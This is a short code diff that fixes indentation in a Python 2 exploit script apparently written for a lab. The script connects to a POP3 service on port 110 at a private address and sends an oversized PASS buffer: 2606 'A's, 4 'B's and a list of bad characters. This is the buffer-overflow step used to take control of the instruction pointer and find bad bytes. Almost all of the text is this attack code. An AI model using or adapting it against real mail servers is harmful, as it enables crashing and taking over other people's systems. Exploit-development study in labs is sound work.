@@ -20,13 +20,13 @@ badchars = (
 "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
 buffer="A"*2606 + "B"*4 + badchars
 try:
-print "\nSending evil buffer..."
-s.connect(('192.168.1.93',110))
-data = s.recv(1024)
-s.send('USER username' +'\r\n')
-data = s.recv(1024)
-s.send('PASS ' + buffer + '\r\n')
-s.close()
-print "\nDone!"
+  print "\nSending evil buffer..."
+  s.connect(('192.168.1.93',110))
+  data = s.recv(1024)
+  s.send('USER username' +'\r\n')
+  data = s.recv(1024)
+  s.send('PASS ' + buffer + '\r\n')
+  s.close()
+  print "\nDone!"
 except:
-print "Could not connect to POP3!"
+  print "Could not connect to POP3!"
